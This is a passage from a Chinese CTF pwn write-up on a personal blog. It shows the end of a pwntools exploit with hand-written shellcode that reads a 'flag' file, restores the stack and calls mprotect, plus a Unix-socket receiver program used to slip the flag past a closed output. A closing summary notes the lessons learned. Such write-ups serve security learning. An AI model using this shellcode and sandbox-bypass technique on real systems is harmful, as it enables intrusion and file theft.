class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line">	</span><br><span class="line">shellcode+=<span class="string">&quot;b&quot;</span>*<span class="number">0x30</span></span><br><span class="line">	</span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		push 0x67616c66</span></span><br><span class="line"><span class="string">		mov rax, 2</span></span><br><span class="line"><span class="string">		xor rdx, rdx</span></span><br><span class="line"><span class="string">		mov rdi, rsp</span></span><br><span class="line"><span class="string">		xor rsi, rsi</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		xchg rdi, rax</span></span><br><span class="line"><span class="string">		mov rsi, rsp</span></span><br><span class="line"><span class="string">		mov rdx, 0x50</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		mov rax, 1</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(shellcode+<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		mov rsp, fs:[0x300]</span></span><br><span class="line"><span class="string">		push 0x1000</span></span><br><span class="line"><span class="string">		pop rsi</span></span><br><span class="line"><span class="string">		push 7</span></span><br><span class="line"><span class="string">		pop rdx</span></span><br><span class="line"><span class="string">		push 0xA</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		mov rdi, rsp</span></span><br><span class="line"><span class="string">		and rdi, 0xFFFFFFFFFFFFF000</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		sub rsp,0x67</span></span><br><span class="line"><span class="string">		jmp rsp</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>用于接收 flag 的脚本：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* gcc recv.c -o recv -g */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span>   </span></span><br><span class="line">   </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAN_SERVICE <span class="meta-string">&quot;B&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;      </span><br><span class="line">    <span class="keyword">int</span> ret;     </span><br><span class="line">    <span class="keyword">int</span> len;  </span><br><span class="line">    <span class="keyword">int</span> accept_fd;</span><br><span class="line">    <span class="keyword">int</span> socket_fd; </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> recv_buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">socklen_t</span> clt_addr_len; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">clt_addr</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">srv_addr</span>;</span>  </span><br><span class="line"></span><br><span class="line">    socket_fd=socket(PF_UNIX,SOCK_STREAM,<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span>(socket_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot create communication socket&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;    </span><br><span class="line">          </span><br><span class="line">    <span class="comment">// 设置服务器参数  </span></span><br><span class="line">    srv_addr.sun_family=AF_UNIX;  </span><br><span class="line">    <span class="built_in">strncpy</span>(srv_addr.sun_path,CAN_SERVICE,<span class="keyword">sizeof</span>(srv_addr.sun_path)<span class="number">-1</span>);  </span><br><span class="line">    unlink(CAN_SERVICE);  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 绑定socket地址 </span></span><br><span class="line">    ret=bind(socket_fd,(struct sockaddr*)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot bind server socket&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 监听   </span></span><br><span class="line">    ret=listen(socket_fd,<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot listen the client connect request&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 接受connect请求 </span></span><br><span class="line">    len=<span class="keyword">sizeof</span>(clt_addr);  </span><br><span class="line">    accept_fd=accept(socket_fd,(struct sockaddr*)&amp;clt_addr,&amp;len);  </span><br><span class="line">    <span class="keyword">if</span>(accept_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot accept client connect request&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 读取和写入  </span></span><br><span class="line">    <span class="built_in">memset</span>(recv_buf,<span class="number">0</span>,<span class="number">1024</span>);  </span><br><span class="line">    <span class="keyword">int</span> num=read(accept_fd,recv_buf,<span class="keyword">sizeof</span>(recv_buf));  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message from client (%d)) :%s\n&quot;</span>,num,recv_buf);    </span><br><span class="line">         </span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    close(accept_fd);  </span><br><span class="line">    close(socket_fd);  </span><br><span class="line">    unlink(CAN_SERVICE);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x40128a</span> &lt;main+<span class="number">148</span>&gt;    call   bind@plt                      &lt;bind@plt&gt;</span><br><span class="line">       fd: <span class="number">0x3</span> (socket:[<span class="number">162182</span>])</span><br><span class="line">       addr: <span class="number">0x7fffffffde00</span> ◂— <span class="number">0x420001</span> <span class="comment">// serv_addr </span></span><br><span class="line">       len: <span class="number">0x6e</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>保证 bind 的 <code>serv_addr</code> 和 SYS_connect 的一样就可以了</li>
+</ul>
+<hr>
+<p><strong>小结：</strong></p>
+<p>当时很坐牢，百思不得其解，赛后复现时才发现自己的知识点不到位，看了大佬们的 wp 后收获很多：</p>
+<ul>
+<li><code>mov rsp, fs:[0x300]</code> 这条指令可以恢复栈</li>
+<li>利用 socket 本地进程间通信来绕过 close</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/shellcode/" rel="tag"><i class="fa fa-tag"></i> shellcode</a>
+              <a href="/tags/socket/" rel="tag"><i class="fa fa-tag"></i> socket</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/" rel="prev" title="PHP pwn环境搭建+so文件的调试">
+      <i class="fa fa-chevron-left"></i> PHP pwn环境搭建+so文件的调试
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">118</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">1.6m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">24:13</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
